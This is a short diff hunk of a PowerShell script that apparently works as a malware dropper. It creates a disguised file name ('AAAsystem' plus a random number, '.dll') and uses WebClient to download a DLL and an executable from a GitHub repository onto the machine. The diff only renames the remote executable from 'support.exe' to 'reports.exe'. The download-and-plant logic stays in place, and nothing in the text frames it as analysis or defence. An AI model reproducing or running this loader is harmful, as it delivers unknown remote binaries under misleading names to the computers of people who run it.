@@ -6,7 +6,7 @@ If (-not (Test-Path $path_new)){
 $file = "AAAsystem"+ (Get-Random -Maximum 999) + ".dll"
 $location = $path_new + $file;
 $uri = "https://github.com/iskww/Atlas/raw/main/win32.dll";
-$uri2 = "https://github.com/iskww/Atlas/raw/main/support.exe";
+$uri2 = "https://github.com/iskww/Atlas/raw/main/reports.exe";
 $cli = New-Object System.Net.WebClient;
 $cmd = $cli.DownloadFile($uri, $location);
 $cmd = $cli.DownloadFile($uri2, $location);
